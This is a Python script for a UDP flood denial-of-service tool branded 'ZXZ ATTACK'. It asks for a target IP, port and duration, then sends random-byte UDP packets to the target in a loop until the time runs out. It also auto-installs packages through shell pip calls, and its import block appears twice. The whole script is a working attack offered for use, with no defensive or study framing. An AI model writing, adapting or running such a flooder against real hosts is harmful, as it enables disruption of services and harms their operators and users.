import os, sys, codecs

try:
    import socks, requests, wget, cfscrape, urllib3
except:
    if sys.platform.startswith("linux"):
        os.system("pip3 install pysocks requests wget cfscrape urllib3 scapy")
    elif sys.platform.startswith("freebsd"):
        os.system("pip3 install pysocks requests wget cfscrape urllib3 scapy")
    else:
        os.system("pip install pysocks requests wget cfscrape urllib3 scapy")

import os, sys, codecs

try:
    import socks, requests, wget, cfscrape, urllib3
except:
    if sys.platform.startswith("linux"):
        os.system("pip3 install pysocks requests wget cfscrape urllib3 scapy")
    elif sys.platform.startswith("freebsd"):
        os.system("pip3 install pysocks requests wget cfscrape urllib3 scapy")
    else:
        os.system("pip install pysocks requests wget cfscrape urllib3 scapy")

from time import time as tt
import threading
import socket
import random

print("""    
\033[35m                ╔═╗═╗\033[93m ╦╔═╗
\033[35m                ╔═╝╔╩╦\033[93m╝╔═╝
\033[35m                ╚═╝╩ ╚═╚\033[93m═╝

             \033[93m>> \033[96mPrivate Tools By ZXZ \033[93m<< 
            \033[97m
""")
ip = str(input("\033[96m Ip \033[35m :\033[91m "))
port = int(input("\033[96m Port \033[35m :\033[91m "))
time = int(input("\033[96m Times \033[35m :\033[91m "))
size = int(input("\033[96m Threads \033[35m :\033[91m "))

brand = """\033[93m
──────────────────▒
─────────────────░█
────────────────███
───────────────██ღ█
──────────────██ღ▒█──────▒█
─────────────██ღ░▒█───────██
─────────────█ღ░░ღ█──────█ღ▒█
────────────█▒ღ░▒ღ░█───██░ღღ█
───────────░█ღ▒░░▒ღ░████ღღღ█
───░───────█▒ღ▒░░░▒ღღღ░ღღღ██─────░█
───▓█─────░█ღ▒░░░░░░░▒░ღღ██─────▓█░
───██─────█▒ღ░░░░░░░░░░ღ█────▓▓██
───██────██ღ▒░░░░░░░░░ღ██─░██ღ▒█
──██ღ█──██ღ░▒░░░░░░░░░░ღ▓██▒ღღ█
──█ღღ▓██▓ღ░░░▒░░░░░░░░▒░ღღღ░░▓█
─██ღ▒▒ღღ░░ღღღღ░░▒░░░░ ღღღღ░░ღღღ██
─█ღ▒ღღ█████████ღღ▒░ღ██████████ღ▒█░
██ღღ▒████████████ღღ████████████░ღ█▒
█░ღღ████████████████████████████ღღ█
█▒ღ██████████████████████████████ღ█
██ღღ████████████████████████████ღ██
─██ღღ██████████████████████████ღ██
──░██ღღ██████████████████████ღღ██
────▓██ღ▒██████████████████▒ღ██
───░──░███ღ▒████████████▒ღ███
────░░───▒██ღღ████████▒ღ██
───────────▒██ღ██████ღ██
─────────────██ღ████ღ█
───────────────█ღ██ღ█
────────────────█ღღ█
────────────────█ღ█░
─────────────────██░

\033[35m                ZXZ ATTACK...
                   CODE BY ZXZ
"""

os.system("clear")
def attack(ip, port, time, size):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(65535, port))
    print(brand)
    print("\033[95m           ZXZ Attacked!!! ")
    fmt = '\033[91mAttack To >>> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    size = os.urandom(min(1081, size))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or random.randint(11, 197)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(size, (ip, port))

    print('\033[92mAttack Finished')
    os.system("cls")

if __name__ == '__main__':
    try:
        attack(ip, port, time, size)
    except KeyboardInterrupt:
        print('Attack stopped.')